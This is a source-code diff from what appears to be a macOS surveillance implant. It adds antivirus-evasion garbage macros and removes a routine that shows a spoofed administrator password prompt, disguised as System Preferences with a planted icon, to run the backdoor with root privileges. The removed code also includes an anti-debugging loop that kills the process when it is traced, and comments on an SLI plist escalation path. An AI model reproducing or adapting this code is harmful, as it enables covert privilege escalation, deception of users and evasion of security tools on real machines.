                                        toPath: [gUtil mSLIPlistPath]
                                         error: &error] == NO)
@@ -3838,6 +5127,8 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
       infoLog(@"SLI File doesn't exists");
 #endif
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       //
       // Create the SLI plist from scratch
@@ -3845,292 +5136,11 @@ void lionSendEventToPid(pid_t pidP)
       return [gUtil createSLIPlistWithBackdoor];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return YES;
 }
 
-- (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized
-{
-  AuthorizationRef myAuthorizationRef;
-  
-  OSStatus myStatus;
-  FILE *myCommunicationsPipe  = NULL;
-  NSString *execPath          = nil;
-  
-  //AuthorizationExternalForm extAuth;
-  char myReadBuffer[256];
-  
-  //
-  // ExtendRights here is used in order to do the infamous sudo
-  //
-  AuthorizationFlags myFlags = kAuthorizationFlagDefaults
-                                | kAuthorizationFlagInteractionAllowed
-                                //| kAuthorizationFlagPreAuthorize
-                                | kAuthorizationFlagExtendRights;
-  
-  //
-  // Looks like icns files don't work here .. Only tif(f) atm
-  //
-  NSString *iconDestinationPath = [[[[[[NSBundle mainBundle] bundlePath]
-                                      stringByDeletingLastPathComponent]
-                                     stringByDeletingLastPathComponent]
-                                    stringByDeletingLastPathComponent]
-                                   stringByAppendingPathComponent: @"_sys.tiff"];
-  
-  NSString *iconCurrentPath = [[[NSBundle mainBundle] bundlePath]
-                               stringByAppendingPathComponent: ICON_FILENAME];
-
-  // If we're authorized we can execute now our backdoor properly
-  if (amIAlreadyAuthorized == YES)
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"Already authorized, relaunching the original file");
-#endif
-    
-      NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
-                                 [[NSBundle mainBundle] bundlePath]];
-      
-      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
-      [searchPattern release];
-      
-      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                                 error: nil];
-      
-      if ([_searchedFile count] > 0)
-        {
-          execPath = [[_searchedFile objectAtIndex: 0]
-                      stringByReplacingOccurrencesOfString: @".ez"
-                      withString: @""];
-#ifdef DEBUG_CORE
-          infoLog(@"execPath: %@", execPath);
-#endif
-        }
-      else
-        {
-#ifdef DEBUG_CORE
-          errorLog(@"ez file not found");
-#endif
-          exit(-1);
-        }    
-    }
-    
-  [[NSFileManager defaultManager] copyItemAtPath: iconCurrentPath
-                                          toPath: iconDestinationPath
-                                           error: nil];
-  
-  //
-  // Looks like the common practice is to split the AuthorizationItem Rights
-  // from the AuthorizationItem Environment since we need to pass 2 different
-  // objects later on while calling AuthorizationCopyRights
-  //
-  AuthorizationItem myItems;
-  myItems.name         = kAuthorizationRightExecute; // system.privilege.admin
-  myItems.valueLength  = 0;
-  myItems.value        = NULL;
-  myItems.flags        = 0;
-  
-  //
-  // Authentication Icon
-  //
-  AuthorizationItem myAuthItems;
-  myAuthItems.name          = kAuthorizationEnvironmentIcon;
-  myAuthItems.valueLength   = strlen((char *)[iconDestinationPath UTF8String]);
-  myAuthItems.value         = (char *)[iconDestinationPath UTF8String];
-  myAuthItems.flags         = 0;
-  
-  AuthorizationRights myRights;
-  myRights.count = 1;
-  myRights.items = &myItems;
-  
-  AuthorizationEnvironment authEnvironment;
-  authEnvironment.count = 1;
-  authEnvironment.items = &myAuthItems;
-  
-#ifdef DEBUG_CORE
-  infoLog(@"Creating authorization");
-#endif
-  
-  //
-  // Create an empty auth ref to fill later
-  //
-  myStatus = AuthorizationCreate(&myRights,
-                                 //kAuthorizationEmptyEnvironment,
-                                 &authEnvironment,
-                                 myFlags,
-                                 &myAuthorizationRef);
-  
-  //
-  // errAuthorizationSuccess returned in case of success
-  //
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error while creating the empty Authorization Reference");
-#endif
-      //return myStatus;
-    }
-  /*
-  myStatus = AuthorizationCopyRights(myAuthorizationRef,
-                                     &myRights,
-                                     //kAuthorizationEmptyEnvironment,
-                                     &authEnvironment,
-                                     myFlags,
-                                     NULL);
-  
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_UI_SPOOF
-      errorLog(@"[EE] Error while authorizing the user");
-#endif
-      
-      [self _createInternalFilesAndFolders];
-      
-      //
-      // Only perform SLI escalation on 10.5 since it doesn't seem to work
-      // on 10.6
-      //
-      if (gOSMajor == 10 && gOSMinor == 5)
-        {
-          if ([self getRootThroughSLI] == YES)
-            {
-#ifdef DEBUG_CORE
-              warnLog(@"Err on auth, switching to SLI PLIST mode");
-#endif
-              [gUtil dropExecFlag];
-            }
-        }
-  
-      [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                                 error: nil];
-      
-      exit(-1);
-    }*/
-  /*  
-  //
-  // Turn an AuthorizationRef into an external "byte blob" form so it can be
-  // passed over the authenticated execution
-  //
-  myStatus = AuthorizationMakeExternalForm(myAuthorizationRef, &extAuth);
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_UI_SPOOF
-      errorLog(@"Unable to turn the AuthorizationRef into external form");
-#endif
-    }*/
-  
-  if (execPath == nil)
-    {
-      if ([gUtil isLeopard])
-        {
-          NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
-                                     [[NSBundle mainBundle] bundlePath]];
-          
-          NSArray *_searchedFile = searchForProtoUpload(searchPattern);
-          [searchPattern release];
-          
-          [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                                     error: nil];
-          
-          if ([_searchedFile count] > 0)
-            {
-              execPath = [[_searchedFile objectAtIndex: 0]
-                          stringByReplacingOccurrencesOfString: @".ez"
-                          withString: @""];
-            }
-          else
-            {
-#ifdef DEBUG_CORE
-              errorLog(@"ez file not found");
-#endif
-              exit(-1);
-            }
-        }
-      else
-        {
-          execPath = [NSString stringWithFormat: @"%@",
-                      [[[NSBundle mainBundle] bundlePath]
-                       stringByAppendingPathComponent: @"System Preferences"]];
-        }
-    }
-  
-#ifdef DEBUG_CORE
-  infoLog(@"Executing with auth (%@)", execPath);
-#endif
-  
-  myStatus = AuthorizationExecuteWithPrivileges(myAuthorizationRef,
-                                                (char *)[execPath UTF8String],
-                                                kAuthorizationFlagDefaults,
-                                                nil,
-                                                &myCommunicationsPipe);
-  
-  if (myStatus != errAuthorizationSuccess)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error on last step");
-#endif
-    }
-  else
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"Auth executed with success (%s)", myReadBuffer);
-#endif
-      read(fileno(myCommunicationsPipe), myReadBuffer, sizeof(myReadBuffer));
-      fclose(myCommunicationsPipe);
-    }
-  
-  [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
-                                             error: nil];
-  
-  //
-  // Free the AuthorizationRef
-  //
-  AuthorizationFree(myAuthorizationRef, kAuthorizationFlagDestroyRights);
-  
-#ifdef DEBUG_CORE
-  warnLog(@"Quitting from auth");
-#endif
-
-  exit(0);
-}
-
-//
-// See http://developer.apple.com/qa/qa2004/qa1361.html
-//
-- (void)xfrth
-{
-  while (true)
-    {
-      int                 junk;
-      int                 mib[4];
-      struct kinfo_proc   info;
-      size_t              size;
-      
-      //
-      // Initialize the flags so that, if sysctl fails for some bizarre
-      // reason, we get a predictable result.
-      //
-      info.kp_proc.p_flag = 0;
-      
-      //
-      // Initialize mib, which tells sysctl the info we want, in this case
-      // we're looking for information about a specific process ID. 
-      //
-      mib[0] = CTL_KERN;
-      mib[1] = KERN_PROC;
-      mib[2] = KERN_PROC_PID;
-      mib[3] = getpid();
-      
-      // Call sysctl
-      size = sizeof(info);
-      junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
-      
-      // We're being debugged if the P_TRACED flag is set
-      if ((info.kp_proc.p_flag & P_TRACED) != 0)
-        {
-          exit(-1);
-        }
-      
-      usleep(50000);
-    }
-}
 
 @end
